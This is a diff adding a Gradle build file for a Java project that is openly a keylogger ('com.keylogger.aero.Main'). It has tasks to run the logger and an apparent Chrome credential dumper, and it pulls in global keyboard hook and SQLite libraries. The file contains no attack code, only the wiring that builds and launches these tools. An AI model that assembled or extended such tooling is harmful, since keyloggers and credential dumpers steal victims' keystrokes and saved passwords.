@@ -1,0 +1,38 @@
+apply plugin: 'application'
+
+mainClassName = "com.keylogger.aero.Main"
+
+sourceSets {
+    main {
+        java {
+            srcDir 'src/java'
+        }
+    }
+}
+
+task executeLogger(type:JavaExec) {
+    //main = "com.example.rummezheni.remotecontrol.RemoteConsole"
+    main = "com.keylogger.aero.Main"
+    classpath = sourceSets.main.runtimeClasspath
+}
+
+task executeDumper(type:JavaExec) {
+    //main = "com.example.rummezheni.remotecontrol.RemoteConsole"
+    main = "me.matt.chrome.acc.Application"
+    classpath = sourceSets.main.runtimeClasspath
+}
+
+task('generateDebugSources') {}
+
+task('generateDebugAndroidTestSources'){}
+
+dependencies {
+    compile fileTree(dir: 'libs', include: ['*.jar'])
+    //compile group: 'com.1stleg', name: 'jnativehook', version: '2.0.2'
+    compile files('libs/JNativeHook.jar')
+    compile files('libs/jna-platform.jar')
+    compile files('libs/jna.jar')
+    compile files('libs/sqlite-jdbc.jar')
+}
+
+
